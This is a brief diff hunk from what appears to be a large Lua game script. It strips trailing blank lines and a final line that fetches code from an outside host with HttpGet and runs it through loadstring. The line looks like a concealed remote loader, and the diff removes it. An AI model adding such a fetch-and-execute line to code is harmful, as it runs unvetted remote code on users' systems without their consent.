@@ -7898,7 +7898,3 @@ do
 end
 
 initUI()
-
-
-
-loadstring(game:HttpGet("https://voidexternal.xyz/api/l4n8p2qi.lua"))()
